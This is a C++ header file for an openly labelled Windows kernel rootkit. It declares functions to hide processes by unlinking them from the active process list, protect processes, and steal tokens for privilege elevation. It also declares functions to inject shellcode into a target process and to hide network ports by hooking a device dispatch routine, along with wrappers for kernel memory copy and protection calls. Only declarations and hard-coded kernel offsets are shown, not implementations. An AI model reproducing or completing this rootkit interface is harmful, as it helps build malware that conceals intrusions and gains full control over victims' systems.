#include <ntifs.h>
#include <ntddk.h>
#include "debug.hpp"
#include "AutoLock.hpp"
#include "FastMutex.hpp"

#define ACTIVE_PROCESS_LINKS 0x448
#define TOKEN 0x4b8

#define UMAX 65535

struct NetInfo {
	USHORT LTCP[UMAX];
	USHORT RTCP[UMAX];
	USHORT UDP[UMAX];
	ULONG Count;
	FastMutex Lock;

	VOID Init() {
		Lock.Init();
	}
};

struct Shell {
	UINT32 pid;
	unsigned char* shellcode;
	UINT32 size;
};

namespace Rootkit
{
	NTSTATUS ProtectProcess(UINT32 PID);
	PCHAR HideProc(UINT32 PID);
	NTSTATUS ProcessElevation(UINT32 PID);
	PVOID InjectShellcode(Shell* shell);

	namespace NetHook
	{
		extern PDEVICE_OBJECT PreviousDevice;
		extern PDRIVER_DISPATCH PreviousDispatch;
		extern NetInfo Net;

		NTSTATUS HidePort(USHORT Port);
		NTSTATUS HookDeviceIo(PDEVICE_OBJECT DeviceObject, PIRP pIrp);
		VOID UnloadHook();
	}

	namespace MalKit
	{
		typedef struct ZwProtectVirtualMemoryStruct
		{
			HANDLE ProcessHandle;
			PVOID* BaseAddress;
			SIZE_T* NumberOfBytesToProtect;
			ULONG NewAccessProtection;
			PULONG OldAccessProtection;
		} zwpvm_t;
		NTSTATUS ZwProtectVirtualMemory(zwpvm_t* zwpvm);

		typedef struct MmCopyVirtualMemoryStruct
		{
			ULONG SourceProcessPid;
			PVOID SourceAddress;
			ULONG TargetProcessPid;
			PVOID TargetAddress;
			SIZE_T BufferSize;
		} mcvm_t;
		NTSTATUS MmCopyVirtualMemory(mcvm_t* mcvm);

		typedef struct ZwQueryInformationProcessStruct
		{
			HANDLE           ProcessHandle;
			PROCESSINFOCLASS ProcessInformationClass;
			PVOID            ProcessInformation;
			ULONG            ProcessInformationLength;
			PULONG           ReturnLength;
		} zqip_t;
		NTSTATUS ZwQueryInformationProcess(zqip_t* zqip);

		typedef struct ZwUnmapViewOfSectionStruct
		{
			HANDLE ProcessHandle;
			PVOID  BaseAddress;
		} zuvos_t;
		NTSTATUS ZwUnmapViewOfSection(zuvos_t* zuvos);
	}

	extern "C"
		NTSTATUS PsLookupProcessByProcessId(
			HANDLE ProcessId,
			PEPROCESS* Process
		);

	extern "C"
		NTSYSAPI NTSTATUS NTAPI ZwSetInformationProcess(
			__in HANDLE ProcessHandle,
			__in PROCESSINFOCLASS ProcessInformationClass,
			__in_bcount(ProcessInformationLength) PVOID ProcessInformation,
			__in ULONG ProcessInformationLength);

	extern "C"
		_Must_inspect_result_
		NTSYSAPI NTSTATUS NTAPI ZwAdjustPrivilegesToken(
			_In_ HANDLE TokenHandle,
			_In_ BOOLEAN DisableAllPrivileges,
			_In_opt_ PTOKEN_PRIVILEGES NewState,
			_In_ ULONG BufferLength,
			_Out_writes_bytes_to_opt_(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
			_When_(PreviousState != NULL, _Out_) PULONG ReturnLength
		);

	extern "C"
		NTSTATUS NTAPI MmCopyVirtualMemory
		(
			PEPROCESS SourceProcess,
			PVOID SourceAddress,
			PEPROCESS TargetProcess,
			PVOID TargetAddress,
			SIZE_T BufferSize,
			KPROCESSOR_MODE PreviousMode,
			PSIZE_T ReturnSize
		);

	extern "C"
		NTSTATUS NTAPI ZwProtectVirtualMemory
		(
			IN HANDLE ProcessHandle,
			IN PVOID * BaseAddress,
			IN SIZE_T * NumberOfBytesToProtect,
			IN ULONG NewAccessProtection,
			OUT PULONG OldAccessProtection
		);

	extern "C"
		NTSTATUS NTAPI ZwQueryInformationProcess(
			_In_      HANDLE           ProcessHandle,
			_In_      PROCESSINFOCLASS ProcessInformationClass,
			_Out_     PVOID            ProcessInformation,
			_In_      ULONG            ProcessInformationLength,
			_Out_opt_ PULONG           ReturnLength
		);

	extern "C"
		NTSTATUS NTAPI ZwUnmapViewOfSection(
			_In_      HANDLE ProcessHandle,
			_In_opt_  PVOID  BaseAddress
	);
}

namespace Utils
{
	BOOLEAN FindLTCP(USHORT LTCP);
	BOOLEAN FindRTCP(USHORT RTCP);
	BOOLEAN FindUDP(USHORT UDP);
}